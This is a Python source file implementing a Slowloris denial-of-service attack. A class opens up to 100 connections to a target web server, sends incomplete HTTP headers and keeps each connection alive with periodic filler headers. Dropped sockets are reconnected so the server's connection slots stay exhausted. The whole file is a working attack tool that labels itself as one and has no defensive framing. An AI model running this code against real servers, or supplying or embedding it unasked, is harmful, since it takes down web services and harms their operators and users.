# tools/slowloris_runner.py
import socket
import time


class SlowlorisAttack:
    def __init__(self, target, port=80, sockets_count=100):
        self.target = target
        self.port = port
        self.sockets_count = sockets_count
        self.sockets = []

    def init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((self.target, self.port))
        s.send(f"GET /?{int(time.time())} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {self.target}\r\n".encode("utf-8"))
        s.send("User-Agent: slowloris\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s

    def run(self, duration=20):
        print(f"[+] Starting Slowloris attack on {self.target}:{self.port}")
        for _ in range(self.sockets_count):
            try:
                s = self.init_socket()
                self.sockets.append(s)
            except socket.error:
                break

        end_time = time.time() + duration
        while time.time() < end_time:
            for s in list(self.sockets):
                try:
                    s.send("X-a: {}\r\n".format(int(time.time())).encode("utf-8"))
                except socket.error:
                    self.sockets.remove(s)
                    try:
                        new_socket = self.init_socket()
                        self.sockets.append(new_socket)
                    except socket.error:
                        continue
            time.sleep(2)
        self.cleanup()

    def cleanup(self):
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        print("[+] Attack completed and sockets closed.")